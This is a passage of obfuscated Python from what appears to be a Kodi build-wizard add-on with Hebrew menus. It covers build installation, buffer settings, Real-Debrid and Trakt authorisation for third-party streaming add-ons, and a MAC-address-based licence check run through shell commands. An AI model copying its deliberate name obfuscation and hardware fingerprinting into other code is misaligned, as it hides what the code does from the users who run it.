			O00O0OOO000OOOO00 =OOOO0OO00OO0000OO #line:1724
		else :#line:1725
			OOOO0OO00OO0000OO =[]#line:1726
			for OO0O0O0OO0OO0O0O0 in O00O0OOO000OOOO00 :#line:1727
				OO0O0OOO00O0OO00O =u"</"+name #line:1728
				OOO00O000O0000000 =OO000O0O0OOOO0O00 .find (OO0O0O0OO0OO0O0O0 )#line:1730
				OO0000O00OOOO0000 =OO000O0O0OOOO0O00 .find (OO0O0OOO00O0OO00O ,OOO00O000O0000000 )#line:1731
				O0OO0O0OO0OO00O00 =OO000O0O0OOOO0O00 .find ("<"+name ,OOO00O000O0000000 +1 )#line:1732
				while O0OO0O0OO0OO00O00 <OO0000O00OOOO0000 and O0OO0O0OO0OO00O00 !=-1 :#line:1734
					OOOO0O000O0O00O0O =OO000O0O0OOOO0O00 .find (OO0O0OOO00O0OO00O ,OO0000O00OOOO0000 +len (OO0O0OOO00O0OO00O ))#line:1735
					if OOOO0O000O0O00O0O !=-1 :#line:1736
						OO0000O00OOOO0000 =OOOO0O000O0O00O0O #line:1737
					O0OO0O0OO0OO00O00 =OO000O0O0OOOO0O00 .find ("<"+name ,O0OO0O0OO0OO00O00 +1 )#line:1738
				if OOO00O000O0000000 ==-1 and OO0000O00OOOO0000 ==-1 :#line:1740
					OO000000O0OO000OO =u""#line:1741
				elif OOO00O000O0000000 >-1 and OO0000O00OOOO0000 >-1 :#line:1742
					OO000000O0OO000OO =OO000O0O0OOOO0O00 [OOO00O000O0000000 +len (OO0O0O0OO0OO0O0O0 ):OO0000O00OOOO0000 ]#line:1743
				elif OO0000O00OOOO0000 >-1 :#line:1744
					OO000000O0OO000OO =OO000O0O0OOOO0O00 [:OO0000O00OOOO0000 ]#line:1745
				elif OOO00O000O0000000 >-1 :#line:1746
					OO000000O0OO000OO =OO000O0O0OOOO0O00 [OOO00O000O0000000 +len (OO0O0O0OO0OO0O0O0 ):]#line:1747
				if ret :#line:1749
					OO0O0OOO00O0OO00O =OO000O0O0OOOO0O00 [OO0000O00OOOO0000 :OO000O0O0OOOO0O00 .find (">",OO000O0O0OOOO0O00 .find (OO0O0OOO00O0OO00O ))+1 ]#line:1750
					OO000000O0OO000OO =OO0O0O0OO0OO0O0O0 +OO000000O0OO000OO +OO0O0OOO00O0OO00O #line:1751
				OO000O0O0OOOO0O00 =OO000O0O0OOOO0O00 [OO000O0O0OOOO0O00 .find (OO000000O0OO000OO ,OO000O0O0OOOO0O00 .find (OO0O0O0OO0OO0O0O0 ))+len (OO000000O0OO000OO ):]#line:1753
				OOOO0OO00OO0000OO .append (OO000000O0OO000OO )#line:1754
			O00O0OOO000OOOO00 =OOOO0OO00OO0000OO #line:1755
		OO00O0O0OO0OO000O +=O00O0OOO000OOOO00 #line:1756
	return OO00O0O0OO0OO000O #line:1758
def addItem (OOOO0O0OO0OO0000O ,OO00O0O000000OOOO ,O0000O00OOO00000O ,OO00000O0OO0000O0 ,O0000OOOO00O00O0O ,description =None ):#line:1760
	if description ==None :description =''#line:1761
	description ='[COLOR white]'+description +'[/COLOR]'#line:1762
	OOOOO0O00O00OOOO0 =sys .argv [0 ]+"?url="+urllib .quote_plus (OO00O0O000000OOOO )+"&mode="+str (O0000O00OOO00000O )+"&name="+urllib .quote_plus (OOOO0O0OO0OO0000O )+"&iconimage="+urllib .quote_plus (OO00000O0OO0000O0 )+"&fanart="+urllib .quote_plus (O0000OOOO00O00O0O )#line:1763
	O00O000OOO0O00O00 =True #line:1764
	O0OO00O00OOOOO000 =xbmcgui .ListItem (OOOO0O0OO0OO0000O ,iconImage =OO00000O0OO0000O0 ,thumbnailImage =OO00000O0OO0000O0 )#line:1765
	O0OO00O00OOOOO000 .setInfo (type ="Video",infoLabels ={"Title":OOOO0O0OO0OO0000O ,"Plot":description })#line:1766
	O0OO00O00OOOOO000 .setProperty ("fanart_Image",O0000OOOO00O00O0O )#line:1767
	O0OO00O00OOOOO000 .setProperty ("icon_Image",OO00000O0OO0000O0 )#line:1768
	O00O000OOO0O00O00 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOOOO0O00O00OOOO0 ,listitem =O0OO00O00OOOOO000 ,isFolder =False )#line:1769
	return O00O000OOO0O00O00 #line:1770
def get_params ():#line:1772
		OO00OO00O0O0OOOOO =[]#line:1773
		O0OO0O0O0OO0OOOO0 =sys .argv [2 ]#line:1774
		if len (O0OO0O0O0OO0OOOO0 )>=2 :#line:1775
				O0000OO0OOOOOOO00 =sys .argv [2 ]#line:1776
				O0O0O000O0OOO000O =O0000OO0OOOOOOO00 .replace ('?','')#line:1777
				if (O0000OO0OOOOOOO00 [len (O0000OO0OOOOOOO00 )-1 ]=='/'):#line:1778
						O0000OO0OOOOOOO00 =O0000OO0OOOOOOO00 [0 :len (O0000OO0OOOOOOO00 )-2 ]#line:1779
				OO0O00OOO0OOO00OO =O0O0O000O0OOO000O .split ('&')#line:1780
				OO00OO00O0O0OOOOO ={}#line:1781
				for OOOOO0O0OOOO0OO0O in range (len (OO0O00OOO0OOO00OO )):#line:1782
						O0O0000OO0OO00O0O ={}#line:1783
						O0O0000OO0OO00O0O =OO0O00OOO0OOO00OO [OOOOO0O0OOOO0OO0O ].split ('=')#line:1784
						if (len (O0O0000OO0OO00O0O ))==2 :#line:1785
								OO00OO00O0O0OOOOO [O0O0000OO0OO00O0O [0 ]]=O0O0000OO0OO00O0O [1 ]#line:1786
		return OO00OO00O0O0OOOOO #line:1788
def decode (O000O00O000O0O00O ,OO0000OO0O00O0OO0 ):#line:1793
    import base64 #line:1794
    O00OOOO000OOOO0O0 =[]#line:1795
    if (len (O000O00O000O0O00O ))!=4 :#line:1797
     return 10 #line:1798
    OO0000OO0O00O0OO0 =base64 .urlsafe_b64decode (OO0000OO0O00O0OO0 )#line:1799
    for O0OO00OO00O0O0O00 in range (len (OO0000OO0O00O0OO0 )):#line:1801
        O0OO000OO0O0OO0O0 =O000O00O000O0O00O [O0OO00OO00O0O0O00 %len (O000O00O000O0O00O )]#line:1802
        O0000O000OOOOOOO0 =chr ((256 +ord (OO0000OO0O00O0OO0 [O0OO00OO00O0O0O00 ])-ord (O0OO000OO0O0OO0O0 ))%256 )#line:1803
        O00OOOO000OOOO0O0 .append (O0000O000OOOOOOO0 )#line:1804
    return "".join (O00OOOO000OOOO0O0 )#line:1805
def tmdb_list (OO00O0000000OO000 ):#line:1806
    OOOO000OOO0OO0OOO =decode ("7643",OO00O0000000OO000 )#line:1809
    return int (OOOO000OOO0OO0OOO )#line:1812
def u_list (O0000OOO00O00OOO0 ):#line:1813
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:1815
        from math import sqrt #line:1816
        OOOO0OO0O00000OOO =tmdb_list (TMDB_NEW_API )#line:1817
        OOOO0OO0O0OO000O0 =str ((getHwAddr ('eth0'))*OOOO0OO0O00000OOO )#line:1819
        OO000OO0OO00000OO =int (OOOO0OO0O0OO000O0 [1 ]+OOOO0OO0O0OO000O0 [2 ]+OOOO0OO0O0OO000O0 [5 ]+OOOO0OO0O0OO000O0 [7 ])#line:1820
        OOO0O00O00O0OOOOO =(ADDON .getSetting ("pass"))#line:1822
        OOOOOO0OO0OO0O00O =(str (round (sqrt ((OO000OO0OO00000OO *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1827
        if '.'in OOOOOO0OO0OO0O00O :#line:1829
         OOOOOO0OO0OO0O00O =(str (round (sqrt ((OO000OO0OO00000OO *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1830
        if OOO0O00O00O0OOOOO ==OOOOOO0OO0OO0O00O :#line:1832
          O0O0OO0OO0OO00OOO =O0000OOO00O00OOO0 #line:1834
        else :#line:1836
           if STARTP2 ()and STARTP ()=='ok':#line:1837
             return O0000OOO00O00OOO0 #line:1840
           O0O0OO0OO0OO00OOO ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1841
           xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1842
           sys .exit ()#line:1843
        return O0O0OO0OO0OO00OOO #line:1844
    else :#line:1845
        STARTP ()#line:1846
def disply_hwr ():#line:1850
   try :#line:1851
    OO00O00000O00O0O0 =tmdb_list (TMDB_NEW_API )#line:1852
    OO0OOOOOO0O0O0000 =str ((getHwAddr ('eth0'))*OO00O00000O00O0O0 )#line:1853
    O0OO00O0OOO0O0O0O =(OO0OOOOOO0O0O0000 [1 ]+OO0OOOOOO0O0O0000 [2 ]+OO0OOOOOO0O0O0000 [5 ]+OO0OOOOOO0O0O0000 [7 ])#line:1860
    OO000O0O00O0O00O0 =(ADDON .getSetting ("action"))#line:1861
    wiz .setS ('action',str (O0OO00O0OOO0O0O0O ))#line:1863
   except :pass #line:1864
def disply_hwr2 ():#line:1865
   try :#line:1866
    O0OO00000O0000OO0 =tmdb_list (TMDB_NEW_API )#line:1867
    OO00O00OOOOOOO00O =str ((getHwAddr ('eth0'))*O0OO00000O0000OO0 )#line:1869
    O00O00000OO00O00O =(OO00O00OOOOOOO00O [1 ]+OO00O00OOOOOOO00O [2 ]+OO00O00OOOOOOO00O [5 ]+OO00O00OOOOOOO00O [7 ])#line:1878
    O0O0OOO000O0O0OO0 =(ADDON .getSetting ("action"))#line:1879
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O00O00000OO00O00O )#line:1882
   except :pass #line:1883
def getHwAddr (O000OO0OO0O00O0OO ):#line:1885
   import subprocess ,time #line:1886
   O00OO0O0000O0O0OO ='windows'#line:1887
   if xbmc .getCondVisibility ('system.platform.android'):#line:1888
       O00OO0O0000O0O0OO ='android'#line:1889
   if xbmc .getCondVisibility ('system.platform.android'):#line:1890
     OO00OOOOO0O0OO00O =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1891
     OOOOO00O0OOOOOO0O =re .compile ('link/ether (.+?) brd').findall (str (OO00OOOOO0O0OO00O ))#line:1893
     OO0OOO0OO0O0O0OOO =0 #line:1894
     for OOO0OO0OO0OO00000 in OOOOO00O0OOOOOO0O :#line:1895
      if OOOOO00O0OOOOOO0O !='00:00:00:00:00:00':#line:1896
          O0O0O0OO0OO0OOOO0 =OOO0OO0OO0OO00000 #line:1897
          OO0OOO0OO0O0O0OOO =OO0OOO0OO0O0O0OOO +int (O0O0O0OO0OO0OOOO0 .replace (':',''),16 )#line:1898
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1900
       O00O0O00OOO0OOOOO =0 #line:1901
       OO0OOO0OO0O0O0OOO =0 #line:1902
       O00000O0000O0O00O =[]#line:1903
       OOOOO0OOOOOOOOO0O =os .popen ("getmac").read ()#line:1904
       OOOOO0OOOOOOOOO0O =OOOOO0OOOOOOOOO0O .split ("\n")#line:1905
       for OOOO0O0O00OOOOO00 in OOOOO0OOOOOOOOO0O :#line:1907
            O00000OOO0OOO00OO =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OOOO0O0O00OOOOO00 ,re .I )#line:1908
            if O00000OOO0OOO00OO :#line:1909
                OOOOO00O0OOOOOO0O =O00000OOO0OOO00OO .group ().replace ('-',':')#line:1910
                O00000O0000O0O00O .append (OOOOO00O0OOOOOO0O )#line:1911
                OO0OOO0OO0O0O0OOO =OO0OOO0OO0O0O0OOO +int (OOOOO00O0OOOOOO0O .replace (':',''),16 )#line:1914
   else :#line:1916
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1917
   try :#line:1934
    return OO0OOO0OO0O0O0OOO #line:1935
   except :pass #line:1936
def getpass ():#line:1937
	disply_hwr2 ()#line:1939
def setpass ():#line:1940
    OO000O000OOOOO0OO =xbmcgui .Dialog ()#line:1941
    OOOOOO0OO0O0000OO =''#line:1942
    O0O0000O0OOO00OO0 =xbmc .Keyboard (OOOOOO0OO0O0000OO ,'הכנס סיסמה')#line:1944
    O0O0000O0OOO00OO0 .doModal ()#line:1945
    if O0O0000O0OOO00OO0 .isConfirmed ():#line:1946
           O0O0000O0OOO00OO0 =O0O0000O0OOO00OO0 .getText ()#line:1947
    wiz .setS ('pass',str (O0O0000O0OOO00OO0 ))#line:1948
def setuname ():#line:1949
    O00O0000O00O00OO0 =''#line:1950
    O0000000000O00000 =xbmc .Keyboard (O00O0000O00O00OO0 ,'הכנס שם משתמש')#line:1951
    O0000000000O00000 .doModal ()#line:1952
    if O0000000000O00000 .isConfirmed ():#line:1953
           O00O0000O00O00OO0 =O0000000000O00000 .getText ()#line:1954
           wiz .setS ('user',str (O00O0000O00O00OO0 ))#line:1955
def powerkodi ():#line:1956
    os ._exit (1 )#line:1957
def buffer1 ():#line:1959
	OOO0O0OOOOOOO00O0 =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1960
	O00OO0O0OOOOO0000 =xbmc .getInfoLabel ("System.Memory(total)")#line:1961
	OOO000000000O00O0 =xbmc .getInfoLabel ("System.FreeMemory")#line:1962
	OOO0OOO0OOO0OO00O =re .sub ('[^0-9]','',OOO000000000O00O0 )#line:1963
	OOO0OOO0OOO0OO00O =int (OOO0OOO0OOO0OO00O )/3 #line:1964
	O00000O0O0O0000O0 =OOO0OOO0OOO0OO00O *1024 *1024 #line:1965
	try :OOO0O0OOOOOO000O0 =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1966
	except :OOO0O0OOOOOO000O0 =16 #line:1967
	OO00OOOO0OOOO00O0 =DIALOG .yesno ('FREE MEMORY: '+str (OOO000000000O00O0 ),'Based on your free Memory your optimal buffersize is: '+str (OOO0OOO0OOO0OO00O )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1970
	if OO00OOOO0OOOO00O0 ==1 :#line:1971
		with open (OOO0O0OOOOOOO00O0 ,"w")as O000000O00OO00OO0 :#line:1972
			if OOO0O0OOOOOO000O0 >=17 :O0OOO0O0OO000000O =xml_data_advSettings_New (str (O00000O0O0O0000O0 ))#line:1973
			else :O0OOO0O0OO000000O =xml_data_advSettings_old (str (O00000O0O0O0000O0 ))#line:1974
			O000000O00OO00OO0 .write (O0OOO0O0OO000000O )#line:1976
			DIALOG .ok ('Buffer Size Set to: '+str (O00000O0O0O0000O0 ),'Please restart Kodi for settings to apply.','')#line:1977
	elif OO00OOOO0OOOO00O0 ==0 :#line:1979
		O00000O0O0O0000O0 =_O0OOO00OOOOOOOOOO (default =str (O00000O0O0O0000O0 ),heading ="INPUT BUFFER SIZE")#line:1980
		with open (OOO0O0OOOOOOO00O0 ,"w")as O000000O00OO00OO0 :#line:1981
			if OOO0O0OOOOOO000O0 >=17 :O0OOO0O0OO000000O =xml_data_advSettings_New (str (O00000O0O0O0000O0 ))#line:1982
			else :O0OOO0O0OO000000O =xml_data_advSettings_old (str (O00000O0O0O0000O0 ))#line:1983
			O000000O00OO00OO0 .write (O0OOO0O0OO000000O )#line:1984
			DIALOG .ok ('Buffer Size Set to: '+str (O00000O0O0O0000O0 ),'Please restart Kodi for settings to apply.','')#line:1985
def xml_data_advSettings_old (OOOO0000OOOOO00O0 ):#line:1986
	OOOOOOOOOO0000OOO ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OOOO0000OOOOO00O0 #line:1996
	return OOOOOOOOOO0000OOO #line:1997
def xml_data_advSettings_New (OOOO0OOO000000O00 ):#line:1999
	O0OO0000OO000O00O ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%OOOO0OOO000000O00 #line:2011
	return O0OO0000OO000O00O #line:2012
def write_ADV_SETTINGS_XML (O0O0OO000OOOO0O0O ):#line:2013
    if not os .path .exists (xml_file ):#line:2014
        with open (xml_file ,"w")as OO0OO00OOOO0OO00O :#line:2015
            OO0OO00OOOO0OO00O .write (xml_data )#line:2016
def _O0OOO00OOOOOOOOOO (default ="",heading ="",hidden =False ):#line:2017
    ""#line:2018
    O0O00OO0OO00O0O00 =xbmc .Keyboard (default ,heading ,hidden )#line:2019
    O0O00OO0OO00O0O00 .doModal ()#line:2020
    if (O0O00OO0OO00O0O00 .isConfirmed ()):#line:2021
        return unicode (O0O00OO0OO00O0O00 .getText (),"utf-8")#line:2022
    return default #line:2023
def index ():#line:2025
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2026
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2027
	if AUTOUPDATE =='Yes':#line:2028
		if wiz .workingURL (WIZARDFILE )==True :#line:2029
			O00O000O0O00000O0 =wiz .checkWizard ('version')#line:2030
			if O00O000O0O00000O0 >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,O00O000O0O00000O0 ),'wizardupdate',themeit =THEME2 )#line:2031
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2032
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2033
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2034
	if len (BUILDNAME )>0 :#line:2035
		OOOO0O0O0O0O0O000 =wiz .checkBuild (BUILDNAME ,'version')#line:2036
		OO000O0OO0OO0OO0O ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2037
		if OOOO0O0O0O0O0O000 >BUILDVERSION :OO000O0OO0OO0OO0O ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(OO000O0OO0OO0OO0O ,OOOO0O0O0O0O0O000 )#line:2038
		addDir (OO000O0OO0OO0OO0O ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2040
		try :#line:2042
		     O0OO000000OO0O000 =wiz .themeCount (BUILDNAME )#line:2043
		except :#line:2044
		   O0OO000000OO0O000 =False #line:2045
		if not O0OO000000OO0O000 ==False :#line:2046
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2047
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2048
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2051
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2052
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2053
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2057
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2059
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2061
def morsetup ():#line:2063
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2064
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2065
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2066
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2067
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2068
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2072
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2073
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2076
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2077
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2087
	setView ('files','viewType')#line:2088
def morsetup2 ():#line:2089
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2090
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2091
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2092
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2093
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2094
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2095
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2096
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2097
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2098
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2099
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2100
def fastupdate ():#line:2101
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2102
def forcefastupdate ():#line:2104
			O0OOO00OOO0OOOOO0 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2105
			wiz .ForceFastUpDate (ADDONTITLE ,O0OOO00OOO0OOOOO0 )#line:2106
def rdsetup ():#line:2110
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2111
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2112
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2114
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2115
def traktsetup ():#line:2118
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2119
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2120
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2121
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2122
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2123
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2124
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2125
	setView ('files','viewType')#line:2126
def setautorealdebrid ():#line:2127
    from resources .libs import real_debrid #line:2128
    O0OOO00OOOO000OOO =real_debrid .RealDebridFirst ()#line:2129
    O0OOO00OOOO000OOO .auth ()#line:2130
def setrealdebrid ():#line:2132
    O0O0OO0OOO0O00000 =(ADDON .getSetting ("auto_rd"))#line:2133
    if O0O0OO0OOO0O00000 =='false':#line:2134
       ADDON .openSettings ()#line:2135
    else :#line:2136
        from resources .libs import real_debrid #line:2137
        O00OOO0OO00OO00O0 =real_debrid .RealDebrid ()#line:2138
        O00OOO0OO00OO00O0 .auth ()#line:2139
        rdon ()#line:2142
def resolveurlsetup ():#line:2144
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2145
def urlresolversetup ():#line:2146
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2147
def placentasetup ():#line:2149
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2150
def reptiliasetup ():#line:2151
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2152
def flixnetsetup ():#line:2153
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2154
def yodasetup ():#line:2155
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2156
def numberssetup ():#line:2157
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2158
def uranussetup ():#line:2159
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2160
def genesissetup ():#line:2161
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2162
def net_tools (view =None ):#line:2164
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2165
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2166
	setView ('files','viewType')#line:2168
def speedMenu ():#line:2169
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2170
def viewIP ():#line:2171
	OO0O00OO0O000O0O0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2185
	OOO00O000O0OOO00O =[];O0000OO00O00OOO00 =0 #line:2186
	for OO0OOO00OOOO000O0 in OO0O00OO0O000O0O0 :#line:2187
		O0O0O00O0OOO0O0O0 =wiz .getInfo (OO0OOO00OOOO000O0 )#line:2188
		O0O0OOO00O0OOO0OO =0 #line:2189
		while O0O0O00O0OOO0O0O0 =="Busy"and O0O0OOO00O0OOO0OO <10 :#line:2190
			O0O0O00O0OOO0O0O0 =wiz .getInfo (OO0OOO00OOOO000O0 );O0O0OOO00O0OOO0OO +=1 ;wiz .log ("%s sleep %s"%(OO0OOO00OOOO000O0 ,str (O0O0OOO00O0OOO0OO )));xbmc .sleep (1000 )#line:2191
		OOO00O000O0OOO00O .append (O0O0O00O0OOO0O0O0 )#line:2192
		O0000OO00O00OOO00 +=1 #line:2193
	O0OO00O0OOOOOOO0O ,OO00OOOO0O0OO0OOO ,OO0O00000OOO0OO00 =getIP ()#line:2194
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00O000O0OOO00O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2195
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO00O0OOOOOOO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2196
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OOOO0O0OO0OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2197
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O00000OOO0OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2198
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00O000O0OOO00O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2199
	setView ('files','viewType')#line:2200
def buildMenu ():#line:2202
	if USERNAME =='':#line:2203
		ADDON .openSettings ()#line:2204
		sys .exit ()#line:2205
	if PASSWORD =='':#line:2206
		ADDON .openSettings ()#line:2207
	OOOOO00OOOO0OOO0O =u_list (SPEEDFILE )#line:2208
	(OOOOO00OOOO0OOO0O )#line:2209
	O0OO00OO00O0O00OO =(wiz .workingURL (OOOOO00OOOO0OOO0O ))#line:2210
	(O0OO00OO00O0O00OO )#line:2211
	O0OO00OO00O0O00OO =wiz .workingURL (SPEEDFILE )#line:2212
	if not O0OO00OO00O0O00OO ==True :#line:2213
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2214
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2215
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2216
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2217
		addFile ('%s'%O0OO00OO00O0O00OO ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2218
	else :#line:2219
